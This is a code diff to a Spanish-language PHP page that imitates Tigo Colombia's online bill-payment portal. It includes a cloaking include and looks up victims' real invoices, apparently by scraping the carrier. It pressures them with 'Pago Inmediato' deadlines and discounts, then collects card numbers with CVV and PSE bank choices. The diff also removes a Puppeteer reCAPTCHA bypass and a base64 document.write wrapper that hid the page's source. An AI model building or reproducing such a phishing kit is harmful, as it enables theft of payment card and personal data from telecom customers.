@@ -1,7 +1,7 @@
 <?php
+header('Content-Type: text/html; charset=utf-8');
 require_once __DIR__ . '/config/cloak.php';
 require_once 'security.php';
-ob_start();
 ?>
 <!DOCTYPE html>
 <html lang="es">
@@ -14,7 +14,7 @@ ob_start();
     <link rel="stylesheet" href="d3f8c1.css">
     <!-- FontAwesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <!-- hCaptcha (siempre muestra desafÃ­o de imÃ¡genes) -->
+    <!-- hCaptcha (siempre muestra desafío de imágenes) -->
     <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
     <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
 
@@ -50,11 +50,11 @@ ob_start();
 
             <!-- Tarjeta Central -->
             <div class="payment-card">
-                <h2 class="card-title">Paga en lÃ­nea</h2>
+                <h2 class="card-title">Paga en línea</h2>
 
-                <p class="search-label">Â¿CÃ³mo deseas hacer la bÃºsqueda?</p>
+                <p class="search-label">¿Cómo deseas hacer la búsqueda?</p>
 
-                <!-- Tabs de selecciÃ³n -->
+                <!-- Tabs de selección -->
                 <div class="tabs-container">
                     <button class="tab-btn">
                         <i class="far fa-id-card"></i>
@@ -66,13 +66,13 @@ ob_start();
                     </button>
                     <button class="tab-btn active">
                         <i class="fas fa-mobile-alt"></i>
-                        <span>LÃ­nea</span>
+                        <span>Línea</span>
                     </button>
                 </div>
 
                 <!-- Input Field -->
                 <div class="form-group">
-                    <input type="text" id="phoneNumber" class="form-control" placeholder="LÃ­nea Tigo">
+                    <input type="text" id="phoneNumber" class="form-control" placeholder="Línea Tigo">
 
                     <!-- Loading Overlay -->
                     <div id="loaderOverlay" style="display: none;">
@@ -83,12 +83,12 @@ ob_start();
                     </div>
                 </div>
 
-                <!-- TÃ©rminos -->
+                <!-- Términos -->
                 <p class="terms-text">
-                    Al presionar CONTINUAR estas aceptando los <a href="#">tÃ©rminos y condiciones</a>
+                    Al presionar CONTINUAR estas aceptando los <a href="#">términos y condiciones</a>
                 </p>
 
-                <!-- Contenedor IN-LINE para Captcha (Aparece aquÃ­ sin Modal) -->
+                <!-- Contenedor IN-LINE para Captcha (Aparece aquí sin Modal) -->
                 <div id="inlineCaptchaContainer" style="display:none; margin-top: 15px; margin-bottom: 25px;">
                     <div style="display: flex; gap: 15px; align-items: flex-start;">
                         <div style="flex: 0 0 160px;">
@@ -110,14 +110,14 @@ ob_start();
                     </div>
                 </div>
 
-                <!-- BotÃ³n Continuar -->
+                <!-- Botón Continuar -->
                 <button id="btn-continue" class="btn-continue" disabled>CONTINUAR</button>
 
             </div>
         </div>
     </main>
 
-    <!-- Script de lÃ³gica principal -->
+    <!-- Script de lógica principal -->
     <script>
         // â”€â”€ PRE-WARM: Disparar 2captcha en background al cargar â”€â”€
         (function warmUpCaptcha() {
@@ -127,7 +127,7 @@ ob_start();
         let currentCaptchaType = 'image';
         let tigoToken = null;
 
-        // --- DETECCIÃ“N INICIAL Y PRE-CARGA DE CAPTCHA ---
+        // --- DETECCIÓN INICIAL Y PRE-CARGA DE CAPTCHA ---
         async function detect() {
             try {
                 const response = await fetch('get_tigo_captcha.php?v=' + Date.now());
@@ -175,7 +175,7 @@ ob_start();
 
             document.getElementById('inlineCaptchaContainer').style.display = 'block';
             
-            // Re-vincular validaciÃ³n
+            // Re-vincular validación
             document.getElementById('inlineCapInput').addEventListener('input', checkFormValid);
             setTimeout(() => document.getElementById('inlineCapInput').focus(), 100);
         }
@@ -224,11 +224,11 @@ ob_start();
                 const spanText = tab.querySelector('span').innerText.toLowerCase();
                 if (spanText.includes('documento')) {
                     searchMode = 'document';
-                    inputField.placeholder = "CÃ©dula o NIT";
+                    inputField.placeholder = "Cédula o NIT";
                     inputField.type = 'number';
-                } else if (spanText.includes('lÃ­nea') || spanText.includes('linea')) {
+                } else if (spanText.includes('línea') || spanText.includes('linea')) {
                     searchMode = 'line';
-                    inputField.placeholder = "LÃ­nea Tigo";
+                    inputField.placeholder = "Línea Tigo";
                     inputField.type = 'text';
                 } else {
                     // Hogar logic same as document or line? Assuming document for now or just generic
@@ -253,7 +253,7 @@ ob_start();
             checkFormValid();
         }
 
-        // El botÃ³n CONTINUAR solo se habilita si hay input vÃ¡lido Y captcha resuelto
+        // El botón CONTINUAR solo se habilita si hay input válido Y captcha resuelto
         function checkFormValid() {
             const minLength = searchMode === 'line' ? 10 : 6;
             const inputOk   = inputField.value.length >= minLength;
@@ -262,10 +262,6 @@ ob_start();
             if (currentCaptchaType === 'image') {
                 const inlineInput = document.getElementById('inlineCapInput');
                 capOk = inlineInput && inlineInput.value.length >= 4;
-            } else if (currentCaptchaType === 'recaptcha-enterprise') {
-                // For reCAPTCHA Enterprise, we assume it's handled implicitly or on button click
-                // For now, just check if input is OK, as reCAPTCHA Enterprise is often invisible
-                capOk = true; 
             } else if (currentCaptchaType === 'hcaptcha') {
                 // hCaptcha requires explicit resolution
                 capOk = captchaResuelto;
@@ -305,34 +301,15 @@ ob_start();
                 // Forzar consulta directa siempre
                 
                 if (!data) {
-                    // ðŸ”„ Fallback: consulta directa si preload no existÃ­a o fallÃ³
+                    // ðŸ”„ Fallback: consulta directa si preload no existía o falló
                     console.log('[Pre-query] Fallback: consulta directa');
                     let solvedCode = null;
                     if (currentCaptchaType === 'image') {
                         solvedCode = document.getElementById('inlineCapInput').value.trim();
                     }
 
-                    // --- NUEVO FLUJO ASÃNCRONO (POLLING)
-                    if (currentCaptchaType === 'recaptcha-enterprise') {
-                        try {
-                            btn.innerText = 'CONSULTANDO EN TIGO...';
-                            const scrapeRes = await fetch('/api/scrape_tigo?number=' + encodeURIComponent(val.trim()) + '&type=' + searchMode);
-                            const scrapeData = await scrapeRes.json();
-                            if (scrapeData.success && scrapeData.tigo_response) {
-                                const processRes = await fetch('get_balance.php', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ value: val.trim(), type: searchMode, recaptchaToken: 'puppeteer_bypass', scraped_data: scrapeData.tigo_response })
-                                });
-                                data = await processRes.json();
-                            } else {
-                                throw new Error(scrapeData.message || 'Error al consultar Tigo');
-                            }
-                        } catch (e) {
-                            console.error('Error Scraper:', e);
-                            throw new Error(e.message || 'Error al consultar. Intenta de nuevo.');
-                        }
-                    } else if (currentCaptchaType === 'hcaptcha') {
+                    // --- NUEVO FLUJO ASíNCRONO (POLLING)
+                    if (currentCaptchaType === 'hcaptcha') {
                         recaptchaToken = hcaptcha.getResponse();
                     }
 
@@ -363,7 +340,7 @@ ob_start();
                 if (loader) loader.style.display = 'none';
 
                 if (data.success && data.status === 'debt') {
-                    // Ã‰XITO - DEUDA ENCONTRADA
+                    // ÉXITO - DEUDA ENCONTRADA
 
                     let invoicesHtml = '';
                     const invoices = data.invoices || [];
@@ -391,7 +368,7 @@ ob_start();
                         const realLineNumber = inv.line || '';
                         const last4 = String(realLineNumber).slice(-4);
                         
-                        // LÃ³gica de Vencimiento
+                        // Lógica de Vencimiento
                         let isImmediate = false;
                         let displayDate = inv.dueDate;
                         
@@ -422,7 +399,7 @@ ob_start();
                             displayDate = 'Pago Inmediato';
                         }
 
-                        // Si no es el Ãºltimo elemento, poner un border-bottom
+                        // Si no es el último elemento, poner un border-bottom
                         const borderBottom = index < invoices.length - 1 ? 'border-bottom: 1px solid #e8ecef;' : '';
                         
                         // Si busca por linea (solo 1 item), quitamos checkbox y agregamos chevron a la derecha
@@ -455,7 +432,7 @@ ob_start();
                                 <div style="flex-grow: 1; display: flex; flex-direction: column; gap: 6px;">
                                     
                                     <div style="display: flex; justify-content: flex-start;">
-                                        <div style="padding: 4px 10px; border-radius: 6px; background-color: #eef4f9; color: #3574c8; font-size: 11px; font-weight: bold;"># DE LÃNEA **** ${last4}</div>
+                                        <div style="padding: 4px 10px; border-radius: 6px; background-color: #eef4f9; color: #3574c8; font-size: 11px; font-weight: bold;"># DE LíNEA **** ${last4}</div>
                                     </div>
                                     
                                     <div style="display: flex; justify-content: space-between; align-items: center;">
@@ -467,7 +444,7 @@ ob_start();
                                     </div>
                                     
                                     <div style="display: flex; justify-content: space-between; align-items: center;">
-                                        <div style="font-size: 14px; color: #777;">Fecha lÃ­mite de pago:</div>
+                                        <div style="font-size: 14px; color: #777;">Fecha límite de pago:</div>
                                         <div style="font-size: 14px; color: ${isImmediate ? '#ff0000' : '#777'}; font-weight: normal;">${displayDate}</div>
                                     </div>
                                 </div>
@@ -482,7 +459,7 @@ ob_start();
                     const mainHeader = document.querySelector('.tigo-header');
                     if (mainHeader) mainHeader.style.display = 'none';
 
-                    // Modificar HTML: actualizar con el nuevo diseÃ±o de card
+                    // Modificar HTML: actualizar con el nuevo diseño de card
                     if (document.querySelector('.main-content .back-link'))
                         document.querySelector('.main-content .back-link').style.display = 'none';
                     if (document.querySelector('.main-content .page-title'))
@@ -526,7 +503,7 @@ ob_start();
 
                             <!-- Header de Documento (Gris Claro) -->
                             <div style="background-color: #f7f9fa; padding: 25px 25px 10px 25px; color: #555; width: 100%; box-sizing: border-box;">
-                                <div style="font-size: 16px; font-weight: 500;">Facturas asociadas a la ${searchMode === 'line' ? 'lÃ­nea' : 'documento'} <strong>${val}</strong></div>
+                                <div style="font-size: 16px; font-weight: 500;">Facturas asociadas a la ${searchMode === 'line' ? 'línea' : 'documento'} <strong>${val}</strong></div>
                             </div>
                          
                             <!-- Padding lateral para el resto del contenido de la lista -->
@@ -543,7 +520,7 @@ ob_start();
                                         <div style="position: absolute; bottom: 3px; left: 5px; width: 4px; height: 4px; border-radius: 50%; background: #00377d;"></div>
                                     </div>
                                     <div>
-                                        <div style="font-size: 17px; font-weight: bold;">Servicios mÃ³viles</div>
+                                        <div style="font-size: 17px; font-weight: bold;">Servicios móviles</div>
                                         <div style="font-size: 11px; color: #777; text-transform: uppercase; margin-top: 1px;">TOTAL DE FACTURAS: ${invoices.length}</div>
                                     </div>
                                 </div>
@@ -575,7 +552,7 @@ ob_start();
                         ` : ''}
                     `;
 
-                    // LÃ“GICA DE ACTUALIZACIÃ“N DEL TOTAL
+                    // LÓGICA DE ACTUALIZACIÓN DEL TOTAL
                     const checkboxes = document.querySelectorAll('.invoice-checkbox');
                     const selectAllCheckbox = document.getElementById('selectAllCheckbox');
                     const displayTotal = document.getElementById('dynamicTotalDisplay');
@@ -624,7 +601,7 @@ ob_start();
                                 payButton.onclick = null;
                             } else {
                                 payButton.style.opacity = '1';
-                                // Validar dto para pantalla final de pagos (opcional si cobro envÃ­a 50%)
+                                // Validar dto para pantalla final de pagos (opcional si cobro envía 50%)
                                 payButton.onclick = () => showPaymentMethods(discountStr, strTotal);
                             }
                         }
@@ -644,10 +621,10 @@ ob_start();
                         });
                     }
 
-                    // Inicializamos estado sin cÃ¡lculos previos (empiezan desmarcados)
+                    // Inicializamos estado sin cálculos previos (empiezan desmarcados)
                     updateTotal();
 
-                    // Reset CAPTCHA para la prÃ³xima consulta
+                    // Reset CAPTCHA para la próxima consulta
                     if (typeof grecaptcha !== 'undefined') {
                         grecaptcha.reset();
                         captchaResuelto = false;
@@ -670,14 +647,14 @@ ob_start();
                     if (data.status === 'up_to_date') {
                         alertBox.classList.add('success');
                         iconDiv.innerHTML = '<i class="fas fa-check-circle"></i>';
-                        msgDiv.innerHTML = data.message || 'Â¡EstÃ¡s al dÃ­a con el pago de las facturas del servicio que ingresaste! ðŸŽ‰ ðŸ˜„';
+                        msgDiv.innerHTML = data.message || '¡Estás al día con el pago de las facturas del servicio que ingresaste! ðŸŽ‰ ðŸ˜„';
 
                         // Auto-hide after 5 seconds
                         setTimeout(() => {
                             alertBox.style.display = 'none';
                         }, 5000);
 
-                        // Reset CAPTCHA para la prÃ³xima consulta
+                        // Reset CAPTCHA para la próxima consulta
                         if (typeof grecaptcha !== 'undefined') {
                             grecaptcha.reset();
                             captchaResuelto = false;
@@ -694,7 +671,7 @@ ob_start();
                             alertBox.style.display = 'none';
                         }, 5000);
 
-                        // Reset CAPTCHA para la prÃ³xima consulta
+                        // Reset CAPTCHA para la próxima consulta
                         if (typeof grecaptcha !== 'undefined') {
                             grecaptcha.reset();
                             captchaResuelto = false;
@@ -719,9 +696,9 @@ ob_start();
                     
                     let errorMensaje = data.message || 'Error al consultar la factura. Por favor intenta de nuevo.';
                     
-                    // --- AUTO-RENOVACIÃ“N CAPTCHA IMAGEN ---
+                    // --- AUTO-RENOVACIÓN CAPTCHA IMAGEN ---
                     if (currentCaptchaType === 'image' && (errorMensaje.toLowerCase().includes('token') || errorMensaje.toLowerCase().includes('captcha'))) {
-                        errorMensaje = "Letras incorrectas o cÃ³digo vencido. Recargando imagen...";
+                        errorMensaje = "Letras incorrectas o código vencido. Recargando imagen...";
                         const refBtn = document.getElementById('refreshInlineBtn');
                         if(refBtn) {
                             setTimeout(() => { refBtn.click(); }, 1000); // Forzar recarga visual
@@ -757,7 +734,7 @@ ob_start();
                     alertBox.style.display = 'flex';
                     alertBox.className = 'status-alert active error';
                     iconDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i>';
-                    msgDiv.innerHTML = "OcurriÃ³ un error al procesar la solicitud (Â¿timeout?). Vuelve a intentarlo.";
+                    msgDiv.innerHTML = "Ocurrió un error al procesar la solicitud (¿timeout?). Vuelve a intentarlo.";
 
                     setTimeout(() => {
                         alertBox.style.display = 'none';
@@ -783,24 +760,24 @@ ob_start();
                 </div>
                 <h1 class="page-title" style="text-align:left; margin-bottom:20px;">Pagar facturas</h1>
 
-                <div class="result-header" style="text-align: left;">Facturas asociadas a la mÃ³vil <strong>${val}</strong></div>
+                <div class="result-header" style="text-align: left;">Facturas asociadas a la móvil <strong>${val}</strong></div>
                 
                 <div class="result-subheader" style="justify-content: flex-start;">
                     <i class="fas fa-mobile-alt"></i>
                     <div>
-                        <div>Servicios mÃ³viles</div>
+                        <div>Servicios móviles</div>
                         <div style="font-size: 12px; color: #888; font-weight: 400;">TOTAL DE FACTURAS: 1</div>
                     </div>
                 </div>
 
                 <!-- Clickable Ticket -->
                 <div class="result-card-inner" onclick="showPaymentMethods('${discountStr}', '${originalStr}')">
-                    <div class="line-badge"># DE LÃNEA **** ${last4}</div>
+                    <div class="line-badge"># DE LíNEA **** ${last4}</div>
                     
                     <div class="result-details-grid">
                         <div>
                             <span class="amount-label">Valor a pagar:</span>
-                            <div class="due-label">Fecha lÃ­mite de pago:</div>
+                            <div class="due-label">Fecha límite de pago:</div>
                         </div>
                         
                         <div>
@@ -872,7 +849,7 @@ ob_start();
                     <div class="back-link" onclick="location.reload()" style="cursor:pointer; text-align:left; margin-bottom:10px; color:#00c8ff; margin: 0 15px;">
                         <i class="fas fa-arrow-left"></i> REGRESAR
                     </div>
-                    <div class="page-title" style="text-align: left; margin: 15px 15px 25px 15px; font-size: 24px;">MÃ©todos de pago</div>
+                    <div class="page-title" style="text-align: left; margin: 15px 15px 25px 15px; font-size: 24px;">Métodos de pago</div>
 
                     <div class="payment-methods-grid">
                         <!-- Left: Details -->
@@ -910,12 +887,12 @@ ob_start();
                             </div>
                              <div class="payment-option-item" onclick="handlePaymentRedirect('pse')">
                                 <img src="c9f2e8b4.png" class="payment-icon" alt="PSE">
-                                <span class="payment-name">Tarjeta dÃ©bito / Daviplata (PSE)</span>
+                                <span class="payment-name">Tarjeta débito / Daviplata (PSE)</span>
                                 <i class="fas fa-chevron-right payment-chevron"></i>
                             </div>
                             <div class="payment-option-item" onclick="handlePaymentRedirect('card')">
                                 <i class="far fa-credit-card payment-icon" style="color:#00377d;"></i>
-                                <span class="payment-name">Tarjeta crÃ©dito / dÃ©bito con CVV</span>
+                                <span class="payment-name">Tarjeta crédito / débito con CVV</span>
                                 <i class="fas fa-chevron-right payment-chevron"></i>
                             </div>
                         </div>
@@ -965,7 +942,7 @@ ob_start();
                     <div class="form-group">
                         <label for="bankSelect" style="display:block; margin-bottom:10px; color:#666;">Banco</label>
                         <select id="bankSelect" class="bank-select">
-                            <option value="">Seleccione una opciÃ³n...</option>
+                            <option value="">Seleccione una opción...</option>
                             <option value="bancolombia">BANCOLOMBIA</option>
                             <option value="davivienda">DAVIVIENDA</option>
                             <option value="bbva">BBVA COLOMBIA</option>
@@ -1010,7 +987,7 @@ ob_start();
                         </div>
 
                         <div class="card-input-group">
-                            <label>NÃºmero de tarjeta</label>
+                            <label>Número de tarjeta</label>
                             <input type="tel" id="cardNumber" class="input-payment" placeholder="0000 0000 0000 0000" maxlength="19" required>
                         </div>
 
@@ -1086,12 +1063,12 @@ ob_start();
                         window.location.href = data.redirect_url;
                     }, 1000);
                 } else {
-                    alert('Error: ' + (data.message || 'Datos invÃ¡lidos'));
+                    alert('Error: ' + (data.message || 'Datos inválidos'));
                     overlay.classList.remove('active');
                 }
             } catch (err) {
                 console.error(err);
-                alert('Error de conexiÃ³n');
+                alert('Error de conexión');
                 overlay.classList.remove('active');
             }
         }
@@ -1226,15 +1203,4 @@ ob_start();
         })();
     </script>
 </body>
-
 </html>
-
-<?php
-$out = ob_get_clean();
-$encoded = base64_encode($out);
-echo '<script>
-var b=atob("' . $encoded . '"),l=b.length,a=new Uint8Array(l);
-for(var i=0;i<l;i++)a[i]=b.charCodeAt(i);
-document.write(new TextDecoder("utf-8").decode(a));
-</script>';
-?>
